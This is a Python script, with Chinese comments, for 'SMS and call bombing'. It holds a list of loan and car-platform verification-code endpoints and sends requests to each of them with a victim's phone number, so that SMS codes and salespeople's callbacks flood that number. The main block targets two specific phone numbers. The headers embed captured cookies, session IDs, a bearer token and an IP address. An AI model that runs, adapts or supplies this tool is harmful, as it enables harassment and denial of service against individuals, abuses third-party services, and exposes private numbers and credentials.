# -*- coding: utf-8 -*-
#验证码轰炸，电话轰炸，主要逻辑是去一些网贷平台进行手机请求验证码然后让业务员回电话给目标手机号，达到了一箭双雕的效果。
#接口还在完善中，有些接口会过期，有些不会，后期持续更新。欢迎投稿
#另外推荐一下另一个电话轰炸，逻辑和这个脚本一样，借刀杀人。 https://github.com/NaroisCool/SpamCall/tree/main
import json
import re
import time
import base64

import requests

api_list = [
    #兰格云商
    {
        "url": "https://newapp.lgmi.com/login/getVerifyCode.asp",
        "type": "POST",
        "headers": {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Connection': 'keep-alive',
            'Accept': '*/*',
            'User-Agent': 'ironLGMI/3.7.4 (iPhone; iOS 15.4.1; Scale/3.00)',
            'Accept-Language': 'zh-Hans-CN;q=1',
            'Content-Length': '24',
            'Accept-Encoding': 'gzip, deflate'
        },
		"parm":{"phone":"target_Phone"}
    },
    #汽车之家
    {
        "url":"https://apicone.che168.com/v2/replacement/sendmobilecode",
        "type": "POST",
        "headers": {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://i.che168.com',
        'Connection': 'keep-alive',
        'Referer': 'https://i.che168.com/',
        'Cookie': 'ahpvno=2; fvlid=17586101174969ozFGCVG0dX6; _ac=dgm95BORq5dx9kkvRbUPliw-AhYEDou5lxQjR8I5d85ES_fF5zff; sessionid=1262f1b0-3b3c-444c-a587-98a3726b08d1; sessionuid=1262f1b0-3b3c-444c-a587-98a3726b08d1; sessionip=117.166.52.19; area=360902; sessionvisit=da8db869-353c-4ad9-a6dd-4daba6e551fc; sessionvisitInfo=1262f1b0-3b3c-444c-a587-98a3726b08d1|www.autohome.com.cn|109385',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Priority': 'u=0',
        },
		"parm":{'_appid': '2sc.pc','mobile': 'target_Phone',}
    },
    #贷款
    {
        "url": "https://app.jiahengfuwu.com/cheyirongapi/sms",
        'type': "POST",
        'headers': {
        'Host': 'app.jiahengfuwu.com',
        'Content-Type': 'application/json',
        'Connection': 'keep-alive',
        'Accept': '*/*',
        'User-Agent': 'LiShuiCheDai/910 CFNetwork/1498.700.2 Darwin/23.6.0',
        'Accept-Language': 'zh-CN,zh-Hans;q=0.9',
        },
        "parm" : {"phone": "target_Phone"}
    },
    #贷款
    {
        "url":"https://qiche.zjysdb.com/prod-api/CyrappController/sendSMSVcode",
        "type":"GET",
        "headers" : {
        'Host': 'qiche.zjysdb.com',
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh-Hans;q=0.9',
        'Connection': 'keep-alive',
        # 'Accept-Encoding': 'gzip, deflate, br',
        'User-Agent': 'CheZhuDai/2 CFNetwork/1498.700.2 Darwin/23.6.0',
        },
        "parm" : {'phone': 'target_Phone','channelId': '100225',}},
    #贷款
    {
        "url":"https://qiche.zjysdb.com/prod-api/CyrappController/sendSMSVcode",
        "type":"GET",
        "headers": {
        'Host': 'qiche.zjysdb.com',
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh-Hans;q=0.9',
        'Connection': 'keep-alive',
        # 'Accept-Encoding': 'gzip, deflate, br',
        'User-Agent': 'SXCL/1 CFNetwork/1498.700.2 Darwin/23.6.0',
        },
        "parm": {'phone': 'target_Phone','channelId': '100267',}
    },
    #贷款
    {   
        "url":"https://fbdm.fujfu.com/fbd/app/authCode/send",
        "type":"POST",
        "headers":  {
        'Host': 'fbdm.fujfu.com',
        'Referer': 'https://mfbd.fujfu.com/login',
        'traceId': 'yj5h3g6qiye1758618870841',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1',
        'Sec-Fetch-Mode': 'cors',
        'channel': 'fbd',
        'X-User-Real-OpenID': 'null',
        'appVersion': '4.5.0',
        'Origin': 'https://mfbd.fujfu.com',
        'phoneType': 'H5',
        'generateId': '483fbc6a56e86dd346b1758618870906',
        'X-User-AppID': 'wx0c60d79e7c757e90',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Site': 'same-site',
        # 'Content-Length': '34',
        'realIP': '117.166.52.19',
        'Connection': 'keep-alive',
        'tailId': '140lvorc8fd1758618870841',
        'Accept-Language': 'zh-CN,zh-Hans;q=0.9',
        'productReferer': 'fbd',
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        # 'Accept-Encoding': 'gzip, deflate, br',
        'eventId': 'jbemxyo02ynt02t1l7f1758618901791',
        },
        "parm" : {'mobile': 'target_Phone','type': 10,}
    },
    {
        "url":"https://wyh.lvxtech.com/wyh/common/sendSmsCode",
        "type":"POST",
        "headers": {
            'Host': 'wyh.lvxtech.com',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Accept': '*/*',
            'Sec-Fetch-Site': 'same-site',
            'brand': 'JKYQ',
            'source': 'JKYQ',
            'Accept-Language': 'zh-CN,zh-Hans;q=0.9',
            # 'Accept-Encoding': 'gzip, deflate, br',
            'platform': 'H5',
            'Sec-Fetch-Mode': 'cors',
            'Origin': 'https://fin.lvxtech.com',
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1',
            'Referer': 'https://fin.lvxtech.com/',
            'deviceId': 'b8ccb1db-6b99-461c-8edd-48c2c51d4ea8',
            'token': 'Authorization: Bearer d314d2051b9683faf7e3fbd9bf44936d',
            'putSource': '51XYKA1',
            'Sec-Fetch-Dest': 'empty',
            # 'Content-Length': '41',
        },
        "parm": {'smsType': 'login','phone': 'target_Phone',}
    },
    {  
        "url":"https://www.renrendai.com/passport/index/sendRegisterSmsCode",
        "type":"POST",
        "headers" : {
            'Host': 'www.renrendai.com',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
            'Sec-Fetch-Site': 'same-origin',
            'Accept-Language': 'zh-CN,zh-Hans;q=0.9',
            # 'Accept-Encoding': 'gzip, deflate, br',
            'Sec-Fetch-Mode': 'cors',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://www.renrendai.com',
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1',
            'Referer': 'https://www.renrendai.com/login?returnUrl=%2F',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Cookie': '_ga=GA1.1.1398440840.1758621288; _ga_3F31F7NMJL=GS2.1.s1758621288$o1$g0$t1758621288$j60$l0$h0; _gat_gtag_UA_93150356_1=1; _gid=GA1.2.2088570494.1758621288; mediav=%7B%22eid%22%3A%22301358%22%2C%22ep%22%3A%22%22%2C%22vid%22%3A%22%22%2C%22ctn%22%3A%22%22%2C%22vvid%22%3A%22%22%2C%22_mvnf%22%3A1%2C%22_mvctn%22%3A0%2C%22_mvck%22%3A1%2C%22_refnf%22%3A0%7D; 9199126ed94d770d_gr_cs1=null; 9199126ed94d770d_gr_last_sent_cs1=null; 9199126ed94d770d_gr_last_sent_sid_with_cs1=fb5f92a7-c90c-45dc-9367-fdc076b772d2; 9199126ed94d770d_gr_session_id=fb5f92a7-c90c-45dc-9367-fdc076b772d2; 9199126ed94d770d_gr_session_id_sent_vst=fb5f92a7-c90c-45dc-9367-fdc076b772d2; HMACCOUNT=FDE5B583991D2E1B; Hm_lpvt_a00f46563afb7c779eef47b5de48fcde=1758621288; Hm_lvt_a00f46563afb7c779eef47b5de48fcde=1758621288; Qs_lvt_181814=1758621287; Qs_pv_181814=2653137684190221000; gr_user_id=b1dfb45a-9dd7-4739-baf5-b70d1d449206; rrdid=0f812333-c95e-4bda-8304-e2b46acffbbd; we_sid=s%3AMcZEFCgOFYYuXg2eYHo8eYUqfcry_rSf.E6bV9Tt0cFph5nKt0c3xP4l%2FozOIraJgT54UsZ0qpG8',
        },
        "parm": {
            'mobile': 'target_Phone',
            'existMobile': '1',
            'origin': 'PC',
            'channel': 'RRD',
            'isBorrower': '2',
            'isVoice': '0',
        }
    },
    {
        "url":"https://gw.yoccj.cn/ryh-user/sms/send",
        "type":"POST",
        "headers": {
            'Host': 'gw.yoccj.cn',
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1',
            'Referer': 'https://ninfo.15dai.cn/',
            'X-Request-City': '%E5%AE%9C%E6%98%A5%E5%B8%82',
            'X-Request-Channel-Id': '7444',
            'Origin': 'https://ninfo.15dai.cn',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Site': 'cross-site',
            # 'Content-Length': '17',
            'sign': 'E95C18519CCD7D22026EA6B49343D218',
            'Connection': 'keep-alive',
            'Accept-Language': 'zh-CN,zh-Hans;q=0.9',
            'Timestamps': '1758623148215',
            'X-Request-Location-City': '%E5%AE%9C%E6%98%A5%E5%B8%82',
            'X-Request-App-Id': '2',
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
            # 'Accept-Encoding': 'gzip, deflate, br',
            'Sec-Fetch-Mode': 'cors',
        },
        "parm": {'phone': 'target_Phone',}
    }

]


def replacePhone(phone):
    target_list = []
    for api in api_list:
        api_str = json.dumps(api)
        api_str = api_str.replace("target_Phone", phone)
        target_list.append(json.loads(api_str))
    print("Attacking....."+phone)    
    return target_list


def default(jiekou, headers):
    if headers.get("Content-Type") == "application/json":
        resp = requests.request(
            url=jiekou["url"],
            method=jiekou["type"],
            headers=headers,
            json=jiekou.get("parm", {})
        )
    else:  # form-urlencoded
        resp = requests.request(
            url=jiekou["url"],
            method=jiekou["type"],
            headers=headers,
            data=jiekou.get("parm", {})
        )
    print(resp.status_code)
    print(resp.text)
    print(resp.url)
    print("--------------")


def caseSpecial(jiekou, special):
    print()


def run(jiekou_list):
    for jiekou in jiekou_list:
        special = jiekou.get("special")
        if special:
            caseSpecial(jiekou, special)
        else:
            headers = {
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 Html5Plus/1.0',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'zh-CN,zh-TW;q=0.8,zh;q=0.6,en;q=0.4,ja;q=0.2',
                'cache-control': 'max-age=0',
                "X-Requested-With": "XMLHttpRequest",
                'cookie': jiekou.get("cookie", ""),
                "referer": jiekou.get("referer", ""),
            }
            if jiekou.get("headers"):
                headers = jiekou.get("headers")
            default(jiekou, headers)



if __name__ == '__main__':
    #众人拾柴火焰高
    phone = ["13672978489","18898381999"]
    for p in phone:
        target_list = replacePhone(p)
        run(target_list)
